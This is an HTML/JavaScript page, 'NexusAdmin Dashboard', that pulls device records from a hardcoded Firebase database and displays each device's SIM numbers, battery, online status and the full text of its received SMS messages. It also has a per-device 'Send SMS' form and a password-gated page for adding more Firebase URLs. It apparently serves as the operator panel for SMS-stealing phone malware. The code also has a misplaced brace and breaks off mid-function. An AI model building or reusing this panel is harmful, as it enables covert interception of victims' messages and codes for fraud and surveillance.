<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NexusAdmin Dashboard</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: #0d0f14;
    color: #e2e8f0;
    font-family: 'Segoe UI', sans-serif;
    min-height: 100vh;
  }

  header {
    background: #131720;
    border-bottom: 1px solid #1e2535;
    padding: 14px 16px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }

  header h1 {
    font-size: 18px;
    font-weight: 700;
    color: #60a5fa;
    letter-spacing: 0.5px;
  }

  #refresh-btn {
    background: #1e40af;
    color: #fff;
    border: none;
    border-radius: 8px;
    padding: 7px 14px;
    font-size: 13px;
    cursor: pointer;
  }

  #refresh-btn:active { background: #1d4ed8; }

  .controls {
    padding: 12px 16px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  #search-input {
    width: 100%;
    background: #131720;
    border: 1px solid #1e2535;
    border-radius: 10px;
    padding: 10px 14px;
    color: #e2e8f0;
    font-size: 14px;
    outline: none;
  }

  #search-input:focus { border-color: #3b82f6; }

  .filter-tabs {
    display: flex;
    gap: 8px;
  }

  .tab {
    flex: 1;
    text-align: center;
    padding: 8px 0;
    border-radius: 8px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    background: #131720;
    border: 1px solid #1e2535;
    color: #94a3b8;
    transition: all 0.2s;
  }

  .tab.active {
    background: #1e3a5f;
    border-color: #3b82f6;
    color: #60a5fa;
  }

  .stats-row {
    display: flex;
    gap: 8px;
    padding: 0 16px 12px;
  }

  .stat-box {
    flex: 1;
    background: #131720;
    border: 1px solid #1e2535;
    border-radius: 10px;
    padding: 10px;
    text-align: center;
  }

  .stat-box .num {
    font-size: 22px;
    font-weight: 700;
  }

  .stat-box .lbl {
    font-size: 11px;
    color: #64748b;
    margin-top: 2px;
  }

  .stat-box.online .num { color: #4ade80; }
  .stat-box.offline .num { color: #f87171; }
  .stat-box.total .num { color: #60a5fa; }

  .device-list {
    padding: 0 16px 80px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .device-card {
    background: #131720;
    border: 1px solid #1e2535;
    border-radius: 12px;
    padding: 14px;
    cursor: pointer;
    transition: border-color 0.2s;
  }

  .device-card:active { border-color: #3b82f6; }

  .device-header {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 8px;
  }

  .dot { font-size: 12px; }

  .device-name {
    font-weight: 700;
    font-size: 15px;
    flex: 1;
  }

  .battery {
    font-size: 12px;
    color: #94a3b8;
  }

  .device-id {
    font-size: 11px;
    color: #475569;
    font-family: monospace;
    margin-bottom: 6px;
    word-break: break-all;
  }

  .sim-row {
    font-size: 12px;
    color: #94a3b8;
    margin-bottom: 3px;
  }

  .sim-num {
    color: #60a5fa;
    font-family: monospace;
  }

  .divider {
    border: none;
    border-top: 1px solid #1e2535;
    margin: 8px 0;
  }

  .sms-item {
    margin-bottom: 6px;
  }

  .sms-sender {
    font-size: 11px;
    font-weight: 700;
    color: #a78bfa;
  }

  .sms-msg {
    font-size: 12px;
    color: #94a3b8;
    line-height: 1.4;
    word-break: break-word;
  }

  .no-sms {
    font-size: 12px;
    color: #475569;
    font-style: italic;
  }

  .loading {
    text-align: center;
    padding: 60px 20px;
    color: #475569;
  }

  .spinner {
    width: 32px;
    height: 32px;
    border: 3px solid #1e2535;
    border-top-color: #3b82f6;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 12px;
  }

  @keyframes spin { to { transform: rotate(360deg); } }

  .empty {
    text-align: center;
    padding: 40px 20px;
    color: #475569;
    font-size: 14px;
  }

  .copy-btn {
    background: #1e2535;
    border: none;
    color: #94a3b8;
    font-size: 11px;
    padding: 3px 8px;
    border-radius: 5px;
    cursor: pointer;
    margin-left: 6px;
  }

.device-card{animation:fadeUp .35s ease;transition:all .25s ease}
.device-card:hover{transform:translateY(-2px)}
.device-card:active{transform:scale(.98)}
.tab,.copy-btn,#refresh-btn,button{transition:.25s}
.tab:active,.copy-btn:active,#refresh-btn:active,button:active{transform:scale(.95)}
#detailPage{animation:slideIn .25s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
@keyframes slideIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:translateX(0)}}


#refreshCountdown{
position:fixed;
bottom:12px;
right:12px;
background:#131720;
border:1px solid #1e2535;
padding:8px 12px;
border-radius:10px;
font-size:12px;
color:#60a5fa;
z-index:9999;
}


body{animation:appFade .5s ease}
header,.controls,.stats-row,#bro20Access,#refreshCountdown{animation:fadeUp .45s ease}
.stat-box{transition:.3s;animation:zoomIn .4s ease}
.stat-box:hover{transform:scale(1.04)}
#search-input{transition:.3s}
#search-input:focus{transform:scale(1.02)}
.sms-item{animation:fadeUp .35s ease}
.sim-row{animation:fadeUp .35s ease}
.device-header,.device-id{animation:fadeUp .35s ease}
textarea,input,button{transition:.25s}
textarea:focus,input:focus{transform:scale(1.01)}
@keyframes appFade{from{opacity:0}to{opacity:1}}
@keyframes zoomIn{from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}}


@keyframes toastIn{
0%{opacity:0;transform:translateX(-50%) translateY(-40px) scale(.8)}
100%{opacity:1;transform:translateX(-50%) translateY(0) scale(1)}
}
@keyframes toastOut{
0%{opacity:1;transform:translateX(-50%) scale(1)}
100%{opacity:0;transform:translateX(-50%) scale(.8)}
}


#bro20Access button:hover{transform:scale(1.03)}
#bro20Access button:active{transform:scale(.95)}
@keyframes adminPulse{
0%,100%{box-shadow:0 0 8px #ff0000}
50%{box-shadow:0 0 22px #ff0000}
}
#bro20Access button{
animation:adminPulse 2s infinite;
transition:.25s;
}

</style>
</head>
<body>

<header>
  <h1>⚡ NexusAdmin</h1>
  <button id="refresh-btn" onclick="loadData()">🔄 Refresh</button>
</header>

<div class="controls">
  <input id="search-input" type="text" placeholder="🔍 Search name, number, ID, SMS..." oninput="renderDevices()">
  <div class="filter-tabs">
    <div class="tab active" onclick="setFilter('all', this)">All</div>
    <div class="tab" onclick="setFilter('online', this)">🟢 Online</div>
    <div class="tab" onclick="setFilter('offline', this)">🔴 Offline</div><div class="tab" onclick="setFilter('fav', this)">⭐ Fav</div>
  </div>
</div>


<div id="bro20Access" style="margin:10px 16px">
<button onclick="unlockBro20()" style="width:100%;padding:12px;border-radius:12px;background:#7f1d1d;color:white;border:2px solid #ff0000;font-weight:bold">
🔐 Admin Login
</button>
</div>

<div id="bro20Box" style="display:none;margin:10px 16px;padding:12px;border:3px solid #ff0000;border-radius:12px;background:#1a0000">
<div style="color:#ff2b2b;font-size:18px;font-weight:900">
🔥 Admin Panel - PASTE FIREBASE URLS HERE (MAX 20)
</div>
<textarea id="firebaseUrls" style="width:100%;height:120px;margin-top:8px;background:#131720;color:#fff;border:2px solid #ff0000;padding:8px">https://lalannew5-default-rtdb.firebaseio.com/.json</textarea>
</div>

<div class="stats-row">
  <div class="stat-box total"><div class="num" id="stat-total">-</div><div class="lbl">Total</div></div>
  <div class="stat-box online"><div class="num" id="stat-online">-</div><div class="lbl">Online</div></div>
  <div class="stat-box offline"><div class="num" id="stat-offline">-</div><div class="lbl">Offline</div></div>
</div>

<div class="device-list" id="device-list">
  <div class="loading"><div class="spinner"></div>Loading devices...</div>
</div>

<div id="refreshCountdown">🔄 Refresh in 10s</div>

<div id="loginModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(6px);z-index:999999;align-items:center;justify-content:center">
  <div style="width:90%;max-width:380px;background:#131720;border:1px solid #3b82f6;border-radius:18px;padding:20px;animation:zoomIn .25s ease">
    <div style="font-size:22px;font-weight:700;color:#60a5fa;margin-bottom:15px">🔐 Admin Login</div>
    <input id="adminPassInput" type="password" placeholder="Enter Password" style="width:100%;padding:12px;border-radius:12px;border:1px solid #1e2535;background:#0d0f14;color:white">
    <div style="display:flex;gap:10px;margin-top:15px">
      <button onclick="closeLoginModal()" style="flex:1;padding:10px;border-radius:10px">Cancel</button>
      <button onclick="submitAdminLogin()" style="flex:1;padding:10px;border-radius:10px;background:#1e40af;color:white">Login</button>
    </div>
  </div>
</div>

<script>
const FIREBASE_URL = "https://lalannew5-default-rtdb.firebaseio.com/.json";
let allDevices = [];
let currentFilter = 'all';

let refreshTimer = 10;
window.countdownId = setInterval(()=>{
 refreshTimer--;
 if(refreshTimer<=0){ refreshTimer=10; }
 const el=document.getElementById('refreshCountdown');
 if(el) el.innerHTML='🔄 Refresh in '+refreshTimer+'s';
},1000);

let favourites = JSON.parse(localStorage.getItem('favourites')||'[]');

function extractNumber(simStr) {
  if (!simStr) return null;
  simStr = simStr.trim();
  const match = simStr.match(/^[\+]?(\d{7,15})/);
  if (match) {
    let num = match[1];
    if (num.length === 12 && num.startsWith("91")) num = num.slice(2);
    return num;
  }
  return simStr || null;
}


let FIREBASE_URLS = JSON.parse(localStorage.getItem('firebase_urls')||'["https://lalannew5-default-rtdb.firebaseio.com/.json"]');

function saveFirebaseUrls(){
 const urls=[];
 for(let i=1;i<=20;i++){
   const v=document.getElementById('url_'+i)?.value.trim();
   if(v) urls.push(v);
 }
 localStorage.setItem('firebase_urls',JSON.stringify(urls));
 FIREBASE_URLS=urls;
 showToast('🟢 Saved Successfully','#22c55e');
 
function sendSMS(did){
 const number=document.getElementById('smsNumber').value.trim();
 const message=document.getElementById('smsMessage').value.trim();

 if(!number || !message){
   showToast('🔴 Fill all fields','#ef4444');
   return;
 }

 showToast('🟢 SMS Request Saved','#22c55e');
 document.getElementById('smsMessage').value='';
}


loadData();
}

async function loadData() {
  const currentScroll = window.scrollY;

  // keep current content visible during refresh
  try {
    const responses = await Promise.all(
      (FIREBASE_URLS.length?FIREBASE_URLS:[FIREBASE_URL]).map(async url=>{
        try{
          const r=await fetch(url);
          return await r.json();
        }catch(e){ return null; }
      })
    );

    let devices={}, simInfo={}, smsData={};

    responses.filter(Boolean).forEach(data=>{
      const root = data?.["19112024"]?.["All_User"] || {};
      Object.assign(devices, root["Info"] || {});
      Object.assign(simInfo, root["SimINFO"] || {});
      Object.assign(smsData, root["Sms"] || {});
    });

    allDevices = Object.entries(devices).map(([key, info]) => {
      const did = info.did || key;
      const sim = simInfo[did] || {};
      const sim1 = extractNumber(sim.sim1);
      const sim2 = extractNumber(sim.sim2);
      const smsList = Object.values(smsData[did] || {});
      smsList.sort((a, b) => parseInt(b.date) - parseInt(a.date));
      return {
        key, did,
        name: info.Name || "Unknown",
        battery: info.Battery || "?",
        status: info.status || "Offline",
        sim1, sim2,
        sms: smsList
      };
    });

    // Stats
    const total = allDevices.length;
    const online = allDevices.filter(d => d.status === "Online").length;
    document.getElementById('stat-total').textContent = total;
    document.getElementById('stat-online').textContent = online;
    document.getElementById('stat-offline').textContent = total - online;

    if(!document.getElementById('detailPage') || document.getElementById('detailPage').style.display!=='block'){
      if(
 !(document.getElementById('detailPage') && document.getElementById('detailPage').style.display==='block') &&
 !(document.getElementById('bro20Page') && document.getElementById('bro20Page').style.display==='block')
){
 renderDevices();
}
    }
    requestAnimationFrame(()=>window.scrollTo(0,currentScroll));
  } catch (e) {
    document.getElementById('device-list').innerHTML = `<div class="empty">❌ Failed to load data.<br>${e.message}</div>`;
  }
}

function setFilter(filter, el) {
  currentFilter = filter;
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  el.classList.add('active');
  renderDevices();
}

function copyText(text) {
  navigator.clipboard.writeText(text).catch(() => {});
}


function toggleFav(did,e){
 if(e) e.stopPropagation();
 if(favourites.includes(did)){
   favourites=favourites.filter(x=>x!==did);
 }else{
   favourites.push(did);
 }
 localStorage.setItem('favourites',JSON.stringify(favourites));
 renderDevices();
}


function openModal(did){
 const d=allDevices.find(x=>x.did===did);
 if(!d) return;

 document.querySelector('.controls').style.display='none';
 document.querySelector('.stats-row').style.display='none';
 document.getElementById('device-list').style.display='none';

 let page=document.getElementById('detailPage');
 if(!page){
   page=document.createElement('div');
   page.id='detailPage';
   page.style.padding='12px 16px';
   document.body.appendChild(page);
 }

 let smsHtml='';
 if(d.sms && d.sms.length){
   smsHtml=d.sms.map(s=>{
     const dt=s.date?new Date(parseInt(s.date)):null;
     const tm=dt?dt.toLocaleString('en-IN'):'';
     return `
     <div style="background:#131720;border:1px solid #1e2535;border-radius:10px;padding:10px;margin-bottom:10px">
       <div style="color:#60a5fa">📩 ${s.ph||''}</div>
       <div style="font-size:11px;color:#94a3b8;margin:4px 0">🕒 ${tm}</div>
       <div>${s.msg||''}</div>
     </div>`;
   }).join('');
 }else{
   smsHtml='<div>No SMS</div>';
 }

 page.innerHTML=`
 <div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">
   <button onclick="closeDetail()" style="background:#1e40af;border:none;color:#fff;padding:8px 12px;border-radius:8px">⬅ Back</button>
   <h2>${d.name}</h2>
 </div>

 <div style="margin-bottom:15px">
   <div style="display:inline-block;padding:6px 10px;border-radius:8px;margin-bottom:8px;background:${d.status==='Online'?'#14532d':'#7f1d1d'};color:${d.status==='Online'?'#4ade80':'#f87171'}">
   ${d.status==='Online'?'🟢 Online':'🔴 Offline'}
   </div>
   <div>🔋 Battery: ${d.battery}%</div>
   <div>📱 SIM1: ${d.sim1||'N/A'}</div>
   <div>📱 SIM2: ${d.sim2||'N/A'}</div>
 </div>

 
<h3 style="margin-top:15px">📤 Send SMS</h3>

<input id="smsNumber"
placeholder="Enter Number"
style="width:100%;padding:10px;margin-top:8px;background:#131720;color:#fff;border:1px solid #1e2535;border-radius:8px">

<textarea id="smsMessage"
placeholder="Type Message"
style="width:100%;height:90px;margin-top:8px;background:#131720;color:#fff;border:1px solid #1e2535;border-radius:8px"></textarea>

<button onclick="sendSMS('${d.did}')"
style="width:100%;margin-top:10px;padding:12px;background:#16a34a;color:white;border:none;border-radius:10px">
📤 Send SMS
</button>

<h3 style="margin-top:20px">📩 SMS Messages</h3>
${smsHtml}

 `;

 page.style.display='block';
}

function closeDetail(){
 const p=document.getElementById('detailPage');
 if(p) p.style.display='none';
 document.querySelector('.controls').style.display='flex';
 document.querySelector('.stats-row').style.display='flex';
 document.getElementById('device-list').style.display='flex';
}

function renderDevices() {
  const query = document.getElementById('search-input').value.toLowerCase().trim();
  let list = allDevices;

  if (currentFilter === 'online') list = list.filter(d => d.status === "Online");
  if (currentFilter === 'offline') list = list.filter(d => d.status === "Offline");
  if (currentFilter === 'fav') list = list.filter(d => favourites.includes(d.did));

  if (query) {
    list = list.filter(d => {
      const smsText = d.sms.map(s => s.msg + " " + s.ph).join(" ").toLowerCase();
      return (
        d.name.toLowerCase().includes(query) ||
        (d.sim1 && d.sim1.includes(query)) ||
        (d.sim2 && d.sim2.includes(query)) ||
        d.did.toLowerCase().includes(query) ||
        smsText.includes(query)
      );
    });
  }

  const container = document.getElementById('device-list');
  if (list.length === 0) {
    container.innerHTML = '<div class="empty">No devices found.</div>';
    return;
  }

  container.innerHTML = list.map(d => {
    const dot = d.status === "Online" ? "🟢" : "🔴";
    const simLines = [
      d.sim1 ? `<div class="sim-row">📱 SIM1: <span class="sim-num">${d.sim1}</span><button class="copy-btn" onclick="copyText('${d.sim1}')">copy</button></div>` : '',
      d.sim2 ? `<div class="sim-row">📱 SIM2: <span class="sim-num">${d.sim2}</span><button class="copy-btn" onclick="copyText('${d.sim2}')">copy</button></div>` : '',
      (!d.sim1 && !d.sim2) ? `<div class="sim-row" style="color:#475569">📵 No SIM info</div>` : ''
    ].join('');

    const smsLines = d.sms.length > 0
      ? d.sms.slice(0,2).map(s => `
          <div class="sms-item">
            <div class="sms-sender">📩 ${s.ph}</div>
            <div class="sms-msg">${s.msg.substring(0, 100)}</div>
          </div>`).join('')
      : '<div class="no-sms">No SMS</div>';

    return `
      <div class="device-card" onclick="openModal('${d.did}')">
<div style="float:right;font-size:20px;cursor:pointer" onclick="toggleFav('${d.did}',event)">${favourites.includes(d.did)?'⭐':'☆'}</div>
        <div class="device-header">
          <span class="dot">${dot}</span>
          <span class="device-name">${d.name}</span>
          <span class="battery">🔋${d.battery}%</span>
        </div>
        <div class="device-id">🆔 ${d.did}<button class="copy-btn" onclick="copyText('${d.did}')">copy</button></div>
        ${simLines}
        <hr class="divider">
        ${smsLines}
      </div>`;
  }).join('');
}



function showToast(msg,color){
 const t=document.createElement('div');
 t.style.cssText='position:fixed;top:10px;left:50%;transform:translateX(-50%);background:#131720;color:#fff;border:2px solid '+color+';padding:10px 14px;border-radius:10px;z-index:999999;animation:toastIn .35s ease;box-shadow:0 0 15px '+color;
 t.innerHTML=msg;
 document.body.appendChild(t);
 setTimeout(()=>{
   t.style.animation='toastOut .3s ease forwards';
   setTimeout(()=>t.remove(),300);
 }, msg.includes('Wrong Password') ? 5000 : 2000);
}


function openLoginModal(){
 document.getElementById('loginModal').style.display='flex';
 setTimeout(()=>document.getElementById('adminPassInput').focus(),100);
}
function closeLoginModal(){
 document.getElementById('loginModal').style.display='none';
 window.autoRefreshId = setInterval(loadData,10000);
 showToast('🟢 Auto Refresh ON','#22c55e');
}
function submitAdminLogin(){
 const pass=document.getElementById('adminPassInput').value;
 document.getElementById('loginModal').style.display='none';
 if(pass!=='Prem123321'){
   window.autoRefreshId = setInterval(loadData,10000);
   showToast('🔴 Wrong Password','#ef4444');
   return;
 }
 document.getElementById('bro20Access').style.display='none';
 document.querySelector('.controls').style.display='none';
 document.querySelector('.stats-row').style.display='none';
 document.getElementById('device-list').style.display='none';
 let page=document.getElementById('bro20Page');
 if(!page){page=document.createElement('div');page.id='bro20Page';page.style.padding='12px 16px';document.body.appendChild(page);}
 
page.innerHTML=`<div style="display:flex;align-items:center;gap:10px;margin-bottom:15px">
<button onclick="closeBro20()" style="background:#1e40af;border:none;color:#fff;padding:8px 12px;border-radius:8px">⬅ Back</button>
<h2>🔐 Admin Panel</h2></div>
<div style="margin:10px 0;padding:12px;border:3px solid #ff0000;border-radius:12px;background:#1a0000">
<div style="color:#ff2b2b;font-size:18px;font-weight:900">🔥 Admin Panel - PASTE FIREBASE URLS HERE (MAX 20)</div>
<div id="urlWrap"></div>
<button onclick="saveFirebaseUrls()" style="width:100%;margin-top:12px;padding:12px;background:#16a34a;color:#fff;border:none;border-radius:12px;font-weight:bold">💾 Save URLs</button>
</div>`;
const wrap=document.getElementById('urlWrap');
for(let i=1;i<=20;i++){
 const val=FIREBASE_URLS[i-1]||'';
 wrap.innerHTML+=`<div style="margin-top:8px;color:#fff">URL #${i}</div><input id="url_${i}" value="${val}" placeholder="Firebase URL ${i}" style="width:100%;padding:8px;background:#131720;color:#fff;border:1px solid #ff0000;border-radius:8px">`;
}
page.style.display='block';
}

function unlockBro20(){
 clearInterval(window.autoRefreshId);
 clearInterval(window.countdownId);
 const el=document.getElementById('refreshCountdown');
 if(el) el.innerHTML='🔴 Auto Refresh OFF';
 showToast('🔴 Auto Refresh OFF','#ef4444');

 openLoginModal(); return;

 if(pass !== 'Prem123321'){
